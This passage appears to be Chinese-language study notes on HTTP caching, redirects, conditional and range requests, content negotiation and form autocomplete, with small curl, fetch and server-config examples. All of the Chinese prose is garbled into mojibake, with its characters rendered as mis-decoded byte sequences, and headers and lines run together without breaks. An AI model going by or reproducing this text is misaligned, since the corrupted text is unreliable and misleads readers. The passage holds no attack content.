HTTP/1.1Host: example.comPragma: no-cacheCache-Control: no-cache ç”±äºè¿™ä¸æ˜¯å¸¦æœ‰ no-cache çš„æ¡ä»¶è¯·æ±‚ï¼Œå› æ­¤ä½ å¯ä»¥ç¡®å®šä½ ä¼šä»æºæœåŠ¡å™¨è·å¾— 200 OK [!CAUTION] â€œno-cacheâ€æ˜¯æ­£å¸¸é‡æ–°åŠ è½½çš„æ­£ç¡®æ¨¡å¼ fetch(â€œ/â€, { cache: â€œno-cacheâ€ }); â€œreloadâ€æ˜¯â€œå¼ºåˆ¶é‡æ–°åŠ è½½â€çš„æ­£ç¡®æ¨¡å¼ fetch(â€œ/â€, { cache: â€œreloadâ€ }); é¿å…é‡æ–°éªŒè¯ ä¸ºäº†é˜²æ­¢ç”¨æˆ·é‡æ–°åŠ è½½æ—¶ï¼ŒæœåŠ¡å™¨åœ¨å†…å®¹æ˜¯ä¸å¯å˜æ—¶ï¼Œä¹Ÿä¼šå‘é€é‡æ–°éªŒè¯è¯·æ±‚ï¼Œimmutable æŒ‡ä»¤å¯ç”¨äºæ˜ç¡®æŒ‡ç¤ºä¸éœ€è¦é‡æ–°éªŒè¯ Cache-Control: max-age=31536000, immutable HTTPé‡å®šå‘ HTTP é‡å®šå‘æ˜¯æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰å°†è¯·æ±‚é‡å®šå‘åˆ°å¦ä¸€ä¸ª URL çš„ä¸€ç§æœºåˆ¶ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨èµ„æºå·²è¢«ç§»åŠ¨ã€ç½‘ç«™ç»“æ„å‘ç”Ÿæ›´æ”¹æˆ–æœåŠ¡å™¨éœ€è¦å°†è¯·æ±‚è·¯ç”±åˆ°ä¸åŒä½ç½®çš„æƒ…å†µä¸‹ HTTP é‡å®šå‘é€šè¿‡è¿”å›ç‰¹å®šçš„çŠ¶æ€ç å’Œ Location å“åº”å¤´æ¥å®ç°ï¼Œæµè§ˆå™¨æ”¶åˆ°è¿™äº›ä¿¡æ¯åï¼Œä¼šè‡ªåŠ¨å‘èµ·å¯¹æ–°çš„ URL çš„è¯·æ±‚ æ°¸ä¹…é‡å®šå‘ è¡¨ç¤ºåŸ URL ä¸åº”å†è¢«ä½¿ç”¨ï¼Œè€Œé€‰ç”¨æ–°çš„ URL æ›¿æ¢å®ƒ æœç´¢å¼•æ“æœºå™¨äººã€RSS é˜…è¯»å™¨ä»¥åŠå…¶ä»–çˆ¬è™«å°†æ›´æ–°èµ„æºåŸå§‹çš„ URL çŠ¶æ€ç  çŠ¶æ€æ–‡æœ¬ å¤„ç†æ–¹æ³• å…¸å‹åº”ç”¨åœºæ™¯ 301 Moved Permanently GET æ–¹æ³•ä¸ä¼šå‘ç”Ÿå˜æ›´ã€‚å…¶ä»–æ–¹æ³•æœ‰å¯èƒ½ä¼šå˜æ›´ä¸º GET æ–¹æ³•ã€‚ ç½‘ç«™é‡æ„ã€‚ 308 Permanent Redirect æ–¹æ³•å’Œæ¶ˆæ¯ä¸»ä½“éƒ½ä¸å‘ç”Ÿå˜åŒ–ã€‚ ä½¿ç”¨ç”¨äºé GET é“¾æ¥/æ“ä½œé‡ç»„ç½‘ç«™ã€‚ ä¸´æ—¶é‡å®šå‘ æœ‰æ—¶å€™è¯·æ±‚çš„èµ„æºæ— æ³•ä»å…¶æ ‡å‡†åœ°å€è®¿é—®ï¼Œä½†æ˜¯å´å¯ä»¥ä»å¦å¤–çš„åœ°æ–¹è®¿é—®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸´æ—¶é‡å®šå‘ã€‚åœ¨åˆ›å»ºã€æ›´æ–°æˆ–è€…åˆ é™¤èµ„æºçš„æ—¶å€™ï¼Œä¸´æ—¶é‡å®šå‘ä¹Ÿå¯ä»¥ç”¨äºæ˜¾ç¤ºä¸´æ—¶æ€§çš„è¿›åº¦é¡µé¢ æœç´¢å¼•æ“å’Œå…¶ä»–çˆ¬è™«ä¸ä¼šè®°å½•æ–°çš„ã€ä¸´æ—¶çš„ URLã€‚ çŠ¶æ€ç  çŠ¶æ€æ–‡æœ¬ å¤„ç†æ–¹æ³• å…¸å‹åº”ç”¨åœºæ™¯ 302 Found GET æ–¹æ³•ä¸ä¼šå‘ç”Ÿå˜æ›´ã€‚å…¶ä»–æ–¹æ³•æœ‰å¯èƒ½ä¼šå˜æ›´ä¸º GET æ–¹æ³•ã€‚[2] ç”±äºä¸å¯é¢„è§çš„åŸå› è¯¥é¡µé¢æš‚ä¸å¯ç”¨ã€‚ 303 See Other GET æ–¹æ³•ä¸ä¼šå‘ç”Ÿå˜æ›´ï¼Œå…¶ä»–æ–¹æ³•ä¼šå˜æ›´ä¸º GET æ–¹æ³•ï¼ˆæ¶ˆæ¯ä¸»ä½“ä¸¢å¤±ï¼‰ã€‚ ç”¨äº PUT æˆ– POST è¯·æ±‚å®Œæˆä¹‹åé‡å®šå‘ï¼Œæ¥é˜²æ­¢ç”±äºé¡µé¢åˆ·æ–°å¯¼è‡´çš„æ“ä½œçš„é‡å¤è§¦å‘ã€‚ 307 Temporary Redirect æ–¹æ³•å’Œæ¶ˆæ¯ä¸»ä½“éƒ½ä¸å‘ç”Ÿå˜åŒ–ã€‚ ç”±äºä¸å¯é¢„è§çš„åŸå› è¯¥é¡µé¢æš‚ä¸å¯ç”¨ã€‚å½“ç«™ç‚¹æ”¯æŒé GET æ–¹æ³•çš„é“¾æ¥æˆ–æ“ä½œçš„æ—¶å€™ï¼Œè¯¥çŠ¶æ€ç ä¼˜äº 302 çŠ¶æ€ç ã€‚ ç‰¹æ®Šé‡å®šå‘ çŠ¶æ€ç  çŠ¶æ€æ–‡æœ¬ å…¸å‹åº”ç”¨åœºæ™¯ 300 Multiple Choice ä¸å¸¸ç”¨ï¼šæ‰€æœ‰çš„é€‰é¡¹åœ¨æ¶ˆæ¯ä¸»ä½“çš„ HTML é¡µé¢ä¸­åˆ—å‡ºã€‚é¼“åŠ±åœ¨ Link æ ‡å¤´ä¸­åŠ å…¥æœºå™¨å¯è¯»çš„ rel=alternate 304 Not Modified å‘é€ç”¨äºé‡æ–°éªŒè¯çš„æ¡ä»¶è¯·æ±‚ã€‚è¡¨ç¤ºç¼“å­˜çš„å“åº”ä»ç„¶æ˜¯æ–°çš„å¹¶ä¸”å¯ä»¥ä½¿ç”¨ã€‚ æŒ‡å‘é‡å®šå‘çš„å…¶ä»–æ–¹å¼ HTMLé‡å®šå‘æœºåˆ¶ ç”¨äºå°†ç”¨æˆ·çš„è¯·æ±‚ä»ä¸€ä¸ªé¡µé¢è‡ªåŠ¨è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ å¯ä»¥å°è¯•åœ¨é¡µé¢çš„headä¸­æ·»åŠ ä¸€ä¸ªmetaå…ƒç´ ï¼Œå¹¶å°†å…¶ http-equiv å±æ€§çš„å€¼è®¾ç½®ä¸º refreshï¼Œå¯ä»¥å‘Šè¯‰æµè§ˆå™¨åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”åè‡ªåŠ¨åŠ è½½å¦ä¸€ä¸ªé¡µé¢ã€‚ è¯¥æ–¹æ³•ä»…é€‚ç”¨äº HTML é¡µé¢ï¼Œç„¶è€Œå¹¶ä¸èƒ½åº”ç”¨äºå›¾ç‰‡æˆ–è€…å…¶ä»–ç±»å‹çš„å†…å®¹ head meta http-equiv=Refresh content=0(ç§’æ•°); URL=http://example.com/(ç›®æ ‡ç½‘å€) //head å€ŸåŠ©DOMçš„ JavaScript é‡å®šå‘æœºåˆ¶ é€šå¸¸ä½¿ç”¨ window.location æˆ– window.location.replace() æ–¹æ³• window.location é€šè¿‡æ”¹å˜æµè§ˆå™¨çš„åœ°å€æ å®ç°é‡å®šå‘ï¼Œç›¸å½“äºç”¨æˆ·ç‚¹å‡»äº†æµè§ˆå™¨çš„åœ°å€æ å¹¶è¾“å…¥æ–°çš„ URL window.location = https://www.example.com; window.location.replace() ä¼šå°†å½“å‰é¡µé¢ä»æµè§ˆå™¨å†å²è®°å½•ä¸­ç§»é™¤ï¼Œå¹¶è·³è½¬åˆ°æ–°é¡µé¢ã€‚å®ƒä¸ä¼šåœ¨æµè§ˆå™¨çš„å†å²è®°å½•ä¸­ç•™ä¸‹å½“å‰é¡µé¢ï¼Œå› æ­¤ç”¨æˆ·æ— æ³•é€šè¿‡åé€€æŒ‰é’®å›åˆ°å½“å‰é¡µé¢ã€‚ç›¸å½“äºæ— ç—•æ¨¡å¼ window.location.replace(https://www.example.com); åº”ç”¨åœºæ™¯ åŸŸååˆ«ç§° æ‰©å¤§ç«™ç‚¹çš„ç”¨æˆ·è¦†ç›–é¢ï¼Œè¿ç§»åˆ°æ–°çš„åŸŸåï¼Œå¼ºåˆ¶ä½¿ç”¨HTTPS ä¿æŒé“¾æ¥æœ‰æ•ˆ å½“ä½ é‡æ„ Web ç«™ç‚¹çš„æ—¶å€™ï¼Œèµ„æºçš„ URL ä¼šå‘ç”Ÿæ”¹å˜ã€‚å³ä¾¿æ˜¯ä½ æ›´æ–°ç«™ç‚¹å†…éƒ¨çš„é“¾æ¥æ¥åŒ¹é…æ–°çš„ URLï¼Œä¹Ÿæ— æ³•æ§åˆ¶è¢«å¤–éƒ¨èµ„æºä½¿ç”¨çš„ URLã€‚ä½ å¹¶ä¸æƒ³å› æ­¤è€Œä½¿æ—§é“¾æ¥å¤±æ•ˆï¼Œå› ä¸ºå®ƒä»¬ä¼šä¸ºä½ å¸¦æ¥å®è´µçš„ç”¨æˆ·å¹¶ä¸”å¸®åŠ©ä¼˜åŒ–ä½ çš„ SEOï¼ˆæœç´¢å¼•æ“ä¼˜åŒ–ï¼Œæ˜¯ä¸€ç§é€šè¿‡ä¼˜åŒ–ç½‘ç«™å’Œç½‘é¡µå†…å®¹æ¥æé«˜å…¶åœ¨æœç´¢å¼•æ“ç»“æœé¡µé¢ï¼ˆSERPï¼‰ä¸­çš„æ’åï¼Œä»è€Œå¢åŠ ç½‘ç«™çš„å¯è§æ€§å’Œè®¿é—®é‡çš„æŠ€æœ¯å’Œç­–ç•¥ï¼‰ï¼Œæ‰€ä»¥éœ€è¦å»ºç«‹ä»æ—§é“¾æ¥åˆ°æ–°é“¾æ¥çš„é‡å®šå‘æ˜ å°„ å¯¹äºä¸å®‰å…¨è¯·æ±‚ã€è€—æ—¶è¯·æ±‚çš„ä¸´æ—¶å“åº” é…ç½®é‡å®šå‘ é€šå¸¸ï¼ŒHTTP é‡å®šå‘æ˜¯ç”±æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼ˆå¦‚ Apache çš„ .htaccess æˆ– Nginx çš„é…ç½®æ–‡ä»¶ï¼‰å®ç°çš„ã€‚ åœ¨ Apache ä¸­ä½¿ç”¨ .htaccess æ–‡ä»¶è®¾ç½® 301 é‡å®šå‘ï¼š Redirect 301 /oldpage http://example.com/newpage åœ¨ Nginx ä¸­è®¾ç½® 301 é‡å®šå‘ï¼š server location /oldpage return 301 http://example.com/newpage; HTTPæ¡ä»¶è¯·æ±‚ å¯ä»¥ç”¨æ¥éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§ï¼Œçœå»ä¸å¿…è¦çš„æ§åˆ¶æ‰‹æ®µï¼Œä»¥åŠéªŒè¯æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œä¾‹å¦‚åœ¨æ–­ç‚¹ç»­ä¼ çš„åœºæ™¯ä¸‹æˆ–è€…åœ¨ä¸Šä¼ æˆ–è€…ä¿®æ”¹æœåŠ¡å™¨ç«¯çš„æ–‡ä»¶çš„æ—¶å€™é¿å…æ›´æ–°ä¸¢å¤±é—®é¢˜ [!NOTE] å¯¹äºå®‰å…¨æ–¹æ³•æ¥è¯´ï¼Œä¾‹å¦‚ GETï¼Œé€šå¸¸ç”¨æ¥è·å–æ–‡ä»¶ï¼Œæ¡ä»¶è¯·æ±‚å¯ä»¥è¢«ç”¨æ¥é™å®šä»…åœ¨æ»¡è¶³æ¡ä»¶çš„æƒ…å†µä¸‹è¿”å›æ–‡ä»¶ã€‚è¿™æ ·å¯ä»¥èŠ‚çœå¸¦å®½ã€‚ å¯¹äºéå®‰å…¨æ–¹æ³•æ¥è¯´ï¼Œä¾‹å¦‚ PUT æ–¹æ³•ï¼Œé€šå¸¸ç”¨æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œæ¡ä»¶è¯·æ±‚å¯ä»¥è¢«ç”¨æ¥é™å®šä»…åœ¨æ»¡è¶³æ–‡ä»¶çš„åˆå§‹ç‰ˆæœ¬ä¸æœåŠ¡å™¨ä¸Šçš„ç‰ˆæœ¬ç›¸åŒçš„æ¡ä»¶ä¸‹æ‰ä¼šå°†å…¶ä¸Šä¼ ã€‚ éªŒè¯å™¨ åœ¨è¯·æ±‚ä¸­ä¼šä¼ é€’ä¸€ä¸ªæè¿°èµ„æºç‰ˆæœ¬çš„å€¼ï¼Œè¿™äº›å€¼ç§°ä¸ºâ€œéªŒè¯å™¨â€ï¼ˆ1.æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œå³ last-modifiedï¼ˆæœ€åä¿®æ”¹ï¼‰æ—¶é—´ï¼›2.ä¸€ä¸ªæ„ä¹‰æ¨¡ç³Šçš„å­—ç¬¦ä¸²ï¼ŒæŒ‡ä»£ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç‰ˆæœ¬ï¼Œç§°ä¸ºâ€œå®ä½“æ ‡ç­¾â€ï¼Œæˆ–è€… etagï¼‰ Last-Modified å’Œ ETag é¦–éƒ¨å‡å¯åº”ç”¨äºä¸¤ç§éªŒè¯ç±»å‹ å¼ºéªŒè¯ç±»å‹ åº”ç”¨äºéœ€è¦é€ä¸ªå­—èŠ‚ç›¸å¯¹åº”çš„æƒ…å†µï¼Œä¾‹å¦‚éœ€è¦è¿›è¡Œæ–­ç‚¹ç»­ä¼ çš„æ—¶å€™ é€šå¸¸è¿™æ˜¯ç”± ETag é¦–éƒ¨æ¥å®Œæˆçš„ï¼Œè¯¥é¦–éƒ¨å¯ä»¥æä¾›ä½¿ç”¨ MD5 ç®—æ³•è·å–çš„èµ„æºï¼ˆæˆ–å…¶è¡ç”Ÿå“ï¼‰çš„æ•£åˆ—å€¼ å¼±éªŒè¯ç±»å‹ åº”ç”¨äºç”¨æˆ·ä»£ç†åªéœ€è¦ç¡®è®¤èµ„æºå†…å®¹ç›¸åŒå³å¯ã€‚å³ä¾¿æ˜¯æœ‰ç»†å¾®å·®åˆ«ä¹Ÿå¯ä»¥æ¥å—ï¼Œæ¯”å¦‚æ˜¾ç¤ºçš„å¹¿å‘Šä¸åŒï¼Œæˆ–è€…æ˜¯é¡µè„šçš„æ—¶é—´ä¸åŒ æ¡ä»¶é¦–éƒ¨ If-Match å¦‚æœè¿œç«¯èµ„æºçš„å®ä½“æ ‡ç­¾ä¸åœ¨ ETag è¿™ä¸ªé¦–éƒ¨ä¸­åˆ—å‡ºçš„å€¼ç›¸åŒçš„è¯ï¼Œè¡¨ç¤ºæ¡ä»¶åŒ¹é…æˆåŠŸã€‚é»˜è®¤åœ°ï¼Œé™¤éå®ä½“æ ‡ç­¾å¸¦æœ‰ â€˜W/â€™ å‰ç¼€ï¼Œå¦è€…å®ƒå°†ä¼šæ‰§è¡Œå¼ºéªŒè¯ã€‚ If-None-Match å¦‚æœè¿œç«¯èµ„æºçš„å®ä½“æ ‡ç­¾ä¸åœ¨ ETag è¿™ä¸ªé¦–éƒ¨ä¸­åˆ—å‡ºçš„å€¼éƒ½ä¸ç›¸åŒçš„è¯ï¼Œè¡¨ç¤ºæ¡ä»¶åŒ¹é…æˆåŠŸã€‚é»˜è®¤åœ°ï¼Œé™¤éå®ä½“æ ‡ç­¾å¸¦æœ‰ â€˜W/â€™ å‰ç¼€ï¼Œå¦è€…å®ƒå°†ä¼šæ‰§è¡Œå¼ºéªŒè¯ã€‚ If-Modified-Since å¦‚æœè¿œç«¯èµ„æºçš„ Last-Modified é¦–éƒ¨æ ‡è¯†çš„æ—¥æœŸæ¯”åœ¨è¯¥é¦–éƒ¨ä¸­åˆ—å‡ºçš„å€¼è¦æ›´æ™šï¼Œè¡¨ç¤ºæ¡ä»¶åŒ¹é…æˆåŠŸã€‚ If-Unmodified-Since å¦‚æœè¿œç«¯èµ„æºçš„ HTTPHeader(â€œLast-Modifiedâ€)}} é¦–éƒ¨æ ‡è¯†çš„æ—¥æœŸæ¯”åœ¨è¯¥é¦–éƒ¨ä¸­åˆ—å‡ºçš„å€¼è¦æ›´æ—©æˆ–ç›¸åŒï¼Œè¡¨ç¤ºæ¡ä»¶åŒ¹é…æˆåŠŸã€‚ If-Range ä¸ If-Match æˆ– If-Unmodified-Since ç›¸ä¼¼ï¼Œä½†æ˜¯åªèƒ½å«æœ‰ä¸€ä¸ªå®ä½“æ ‡ç­¾æˆ–è€…æ—¥æœŸå€¼ã€‚å¦‚æœåŒ¹é…å¤±è´¥ï¼Œåˆ™æ¡ä»¶è¯·æ±‚å®£å‘Šå¤±è´¥ï¼Œæ­¤æ—¶å°†ä¸ä¼šè¿”å› 206 Partial Content å“åº”ç ï¼Œè€Œæ˜¯è¿”å› 200 OK å“åº”ç ï¼Œä»¥åŠå®Œæ•´çš„èµ„æºã€‚ HTTPèŒƒå›´è¯·æ±‚ HTTP çš„ Range è¯·æ±‚ä½¿å®¢æˆ·ç«¯èƒ½å¤Ÿè¦æ±‚æœåŠ¡å™¨ä»…å‘å…¶å›ä¼  HTTP æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†ã€‚ èŒƒå›´è¯·æ±‚å¯¹äºæ”¯æŒéšæœºè®¿é—®çš„åª’ä½“æ’­æ”¾å™¨ã€æ˜ç¡®åªéœ€å¤§å‹æ–‡ä»¶æŸéƒ¨åˆ†çš„æ•°æ®å¤„ç†å·¥å…·ï¼Œä»¥åŠå…è®¸ç”¨æˆ·æš‚åœåŠæ¢å¤ä¸‹è½½çš„ä¸‹è½½ç®¡ç†å™¨ç­‰å®¢æˆ·ç«¯å°¤å…¶æœ‰ç”¨ æ£€æµ‹æœåŠ¡å™¨ç«¯æ˜¯å¦æ”¯æŒèŒƒå›´è¯·æ±‚ å¦‚æœ HTTP å“åº”ä¸­å­˜åœ¨ Accept-Ranges æ ‡å¤´ï¼š 1.å…¶å€¼ä¸æ˜¯â€œnoneâ€ï¼Œé‚£ä¹ˆè¯¥æœåŠ¡å™¨æ”¯æŒèŒƒå›´è¯·æ±‚ã€‚ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨åƒ cURL è¿™æ ·çš„å·¥å…·å‘å‡ºä¸€ä¸ª HEAD è¯·æ±‚æ¥è¿›è¡Œæ‰‹åŠ¨æ£€æŸ¥ curl -I http://i.imgur.com/z4d4kWk.jpg HTTP/1.1 200 OKâ€¦Accept-Ranges: bytesContent-Length: 146515 2.å¦‚æœç½‘ç«™çœç•¥äº† Accept-Ranges æ ‡å¤´ï¼Œé‚£ä¹ˆå®ƒä»¬å¾ˆå¯èƒ½ä¸æ”¯æŒéƒ¨åˆ†è¯·æ±‚ã€‚æœ‰äº›ç½‘ç«™ä¼šåŒ…å«è¿™ä¸ªæ ‡å¤´ï¼Œä½†æ˜ç¡®å°†å…¶å€¼è®¾ä¸ºâ€œnoneâ€ï¼Œä»¥è¡¨æ˜å®ƒä»¬ä¸æ”¯æŒè¿™ä¸€ç‰¹æ€§ HTTP/1.1 200 OKâ€¦Accept-Ranges: none åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸‹è½½ç®¡ç†å™¨å¯èƒ½ä¼šç¦ç”¨æš‚åœæŒ‰é’® ä»æœåŠ¡å™¨ç«¯è¯·æ±‚ç‰¹å®šçš„èŒƒå›´ åœ¨ HTTP è¯·æ±‚ä¸­åŒ…å« Range æ ‡å¤´ï¼Œå¯ä»¥æŒ‡å®šå¸Œæœ›æœåŠ¡å™¨è¿”å›æ–‡æ¡£çš„å“ªä¸€éƒ¨åˆ†æˆ–å“ªäº›éƒ¨åˆ† å•ä¸€èŒƒå›´ curlçš„â€œ-Hâ€é€‰é¡¹ä¼šå‘è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ªæ ‡å¤´ï¼Œå³ Range æ ‡å¤´ curl http://i.imgur.com/z4d4kWk.jpg -i -H Range: bytes=0-1023 ç”¨äºè¯·æ±‚1024å­—èŠ‚ å‘å‡ºè¯·æ±‚å¦‚ä¸‹ GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 æœåŠ¡å™¨å°†ä¼šè¿”å› 206 Partial Content çŠ¶æ€ HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024â€¦ï¼ˆäºŒè¿›åˆ¶å†…å®¹ï¼‰ å¤šé‡èŒƒå›´ Range æ ‡å¤´è¿˜å…è®¸åœ¨æ–‡æ¡£ä¸­æ”¯æŒä¸€æ¬¡æ€§è·å–å¤šé‡èŒƒå›´ã€‚è¿™äº›èŒƒå›´ä½¿ç”¨é€—å·åˆ†éš” curl http://www.example.com -i -H Range: bytes=0-50, 100-150 æœåŠ¡å™¨ä»¥ 206 Partial Content çŠ¶æ€ç ä»¥åŠ Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5 æ ‡å¤´å“åº”ï¼Œè¡¨æ˜éšåçš„æ•°æ®å°†é‡‡ç”¨å¤šéƒ¨åˆ†å­—èŠ‚èŒƒå›´æ ¼å¼ã€‚ æ¯ä¸ªéƒ¨åˆ†éƒ½æºå¸¦è‡ªå·±çš„ Content-Type å’Œ Content-Range å­—æ®µï¼Œè€Œå¿…é¡»çš„ boundary å‚æ•°å®šä¹‰äº†ç”¨äºåˆ†å‰²æ¯ä¸ªæ¶ˆæ¯ä½“éƒ¨åˆ†çš„è¾¹ç•Œå­—ç¬¦ä¸² æ¡ä»¶å¼èŒƒå›´è¯·æ±‚ If-Range HTTP è¯·æ±‚æ ‡å¤´ä½¿èŒƒå›´è¯·æ±‚å…·æœ‰æ¡ä»¶æ€§ï¼šå¦‚æœæ¡ä»¶å…‘ç°ï¼Œåˆ™ä¼šå‘èµ·èŒƒå›´è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†ä»¥åŒ…å«é€‚å½“å†…å®¹ä¸»ä½“çš„ 206 Partial Content å“åº”è¿›è¡Œå›å¤ã€‚å¦‚æœæ¡ä»¶ä¸å…‘ç°ï¼Œä¼šè¢«å‘é€å®Œæ•´çš„èµ„æºå›æ¥ï¼Œå¹¶å¸¦æœ‰ 200 OK çŠ¶æ€ã€‚è¯¥æ ‡å¤´å¯ä¸ Last-Modified éªŒè¯å™¨æˆ– ETag ä¸€èµ·ä½¿ç”¨ï¼Œä½†ä¸èƒ½åŒæ—¶ä½¿ç”¨ If-Range: Wed, 21 Oct 2015 07:28:00 GMT èŒƒå›´è¯·æ±‚çš„å“åº” 206 Partial Content èŒƒå›´è¯·æ±‚æˆåŠŸ 416 Requested Range Not Satisfiableè¶…å‡ºèŒƒå›´çš„èŒƒå›´è¯·æ±‚ 200 OKä¸æ”¯æŒèŒƒå›´è¯·æ±‚ï¼Œå¹¶ä¼ è¾“å®Œæ•´çš„å“åº”ä½“ HTTPå†…å®¹åå•† ä¸€ç§ HTTP æœºåˆ¶ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶æ ¹æ®å®¢æˆ·ç«¯çš„éœ€æ±‚å’ŒæœåŠ¡å™¨æ”¯æŒçš„å†…å®¹æ¥åå•†è¿”å›çš„èµ„æºå½¢å¼ã€‚è¿™ç§æœºåˆ¶é€šå¸¸ç”¨åœ¨éœ€è¦æä¾›ä¸åŒæ ¼å¼ã€è¯­è¨€ã€ç¼–ç æˆ–ç‰ˆæœ¬çš„èµ„æºæ—¶ æœåŠ¡ç«¯é©±åŠ¨å‹ æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯åœ¨è¯·æ±‚å¤´ä¸­æä¾›çš„ä¿¡æ¯æ¥å†³å®šè¿”å›çš„èµ„æºç‰ˆæœ¬ Acceptæ ‡å¤´ åˆ—ä¸¾äº†ç”¨æˆ·ä»£ç†å¸Œæœ›æ¥æ”¶çš„åª’ä½“èµ„æºçš„ MIME ç±»å‹ï¼ˆå¦‚ text/html, application/jsonï¼‰ Accept-CHæ ‡å¤´ åˆ—å‡ºäº†æœåŠ¡å™¨å¯ä»¥ç”¨æ¥é€‰æ‹©åˆé€‚å“åº”çš„é…ç½®æ•°æ® å€¼ å«ä¹‰ Device-Memory æ ‡æ˜å®¢æˆ·ç«¯è®¾å¤‡çš„å†…å­˜å¤§å°ã€‚è¯¥å€¼æ˜¯ä¸ªä¼°è®¡å€¼ï¼Œè®¾å¤‡çš„å®é™…å†…å­˜å€¼ä¼šå‘ 2 çš„æ¬¡æ–¹å–æ•´ï¼Œä¸”é™¤ä»¥ 1024ã€‚æ¯”å¦‚ 512MB çš„å†…å­˜å¯¹åº”çš„å€¼ä¸º 0.5ã€‚ Viewport-Width æ ‡æ˜ç”¨ CSS åƒç´ æ•°å€¼è¡¨ç¤ºçš„å¸ƒå±€è§†å£ï¼ˆlayout viewportï¼‰å®½åº¦ã€‚ Width æ ‡æ˜ç”¨ç‰©ç†åƒç´ å€¼è¡¨ç¤ºçš„èµ„æºå®½åº¦ï¼ˆæ¢å¥è¯è¯´å°±æ˜¯ä¸€å¼ å›¾ç‰‡çš„å›ºæœ‰å¤§å°ï¼‰ã€‚ Accept-Encodingæ ‡å¤´ è¯´æ˜äº†ï¼ˆæ¥æ”¶ç«¯ï¼‰å¯ä»¥æ¥å—çš„å†…å®¹ç¼–ç å½¢å¼ï¼ˆæ‰€æ”¯æŒçš„å‹ç¼©ç®—æ³•ï¼‰ï¼ˆå¦‚ gzip, deflateï¼‰ Accept-Languageæ ‡å¤´ æç¤ºç”¨æˆ·æœŸæœ›è·å¾—çš„è‡ªç„¶è¯­è¨€çš„ä¼˜å…ˆé¡ºåºï¼ˆå¦‚ en-US, zh-CNï¼‰ User-Agentæ ‡å¤´ æä¾›å®¢æˆ·ç«¯çš„è®¾å¤‡ä¿¡æ¯ Varyå“åº”æ ‡å¤´ ç”¨äºå‘Šè¯‰å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨ï¼ˆå¦‚ç¼“å­˜æœåŠ¡å™¨ï¼‰ï¼Œå“ªäº›è¯·æ±‚å¤´ä¼šå½±å“è¿”å›å†…å®¹çš„å˜åŒ– å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œvaryç”¨äºåœ¨ä½¿ç”¨å†…å®¹åå•†æ—¶åˆ›å»ºç¼“å­˜é”® Vary: *Vary: header-name, header-name, ... *è¡¨ç¤ºå“åº”å› æ— æ³•ç¡®å®šçš„åŸå› è€Œæ”¹å˜ï¼Œç¦æ­¢ç¼“å­˜æ­¤å“åº” header-nameæŒ‡å½±å“å“åº”å†…å®¹çš„è¯·æ±‚å¤´åç§°ï¼Œä¾‹å¦‚ Acceptã€Accept-Language å¦‚æœæœåŠ¡å™¨æ ¹æ® Accept è¯·æ±‚å¤´è¿”å›ä¸åŒçš„èµ„æºï¼ˆå¦‚ JSON æˆ– HTMLï¼‰ï¼Œåˆ™åº”è¯¥åœ¨å“åº”ä¸­æ·»åŠ ï¼š Vary: Accept å¦‚æœæœåŠ¡å™¨æ ¹æ® Accept-Language è¿”å›ä¸åŒçš„è¯­è¨€å†…å®¹ï¼š Vary: Accept-Language å¦‚æœæœåŠ¡å™¨æ ¹æ® Accept-Encoding æä¾›ä¸åŒçš„å‹ç¼©æ ¼å¼ï¼ˆå¦‚ gzip æˆ– brï¼‰ï¼š Vary: Accept-Encoding å¦‚æœæœåŠ¡å™¨æ ¹æ® User-Agent æä¾›ä¸åŒçš„å†…å®¹ï¼ˆå¦‚æ¡Œé¢å’Œç§»åŠ¨è®¾å¤‡ä¼˜åŒ–ï¼‰ï¼š Vary: User-Agent ä»£ç†é©±åŠ¨å‹ï¼ˆå“åº”å¼åå•†) å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡å¤šæ¬¡äº¤äº’æ¥ç¡®å®šæœ€ä½³èµ„æºç‰ˆæœ¬ï¼Œé¢ä¸´ä¸æ˜ç¡®çš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªé¡µé¢ï¼Œå…¶ä¸­åŒ…å«äº†å¯ä¾›é€‰æ‹©çš„èµ„æºçš„é“¾æ¥ HTTPå®‰å…¨ ç”¨æˆ·ä¿¡æ¯å®‰å…¨ å¦‚ä½•å…³é—­è¡¨å•è‡ªåŠ¨å¡«å…… æµè§ˆå™¨èƒ½å¤Ÿæä¾›è‡ªåŠ¨è¡¥å…¨ï¼ˆåœ¨ç”¨æˆ·å¼€å§‹è¾“å…¥çš„æ—¶å€™ç»™ç”¨æˆ·æä¾›å¯èƒ½çš„å†…å®¹ï¼‰å’Œè‡ªåŠ¨å¡«å……ï¼ˆåœ¨åŠ è½½çš„æ—¶å€™é¢„å…ˆå¡«å……æŸäº›å­—æ®µï¼‰åŠŸèƒ½ï¼Œä½†å¯èƒ½æ¶‰åŠç”¨æˆ·çš„éšç§ï¼Œå› æ­¤æµè§ˆå™¨å…è®¸ç”¨æˆ·ç¦ç”¨è¿™äº›åŠŸèƒ½ ç¦æ­¢è‡ªåŠ¨è¡¥å…¨ å°† autocomplete çš„å±æ€§è®¾ç½®ä¸º â€œoffâ€ 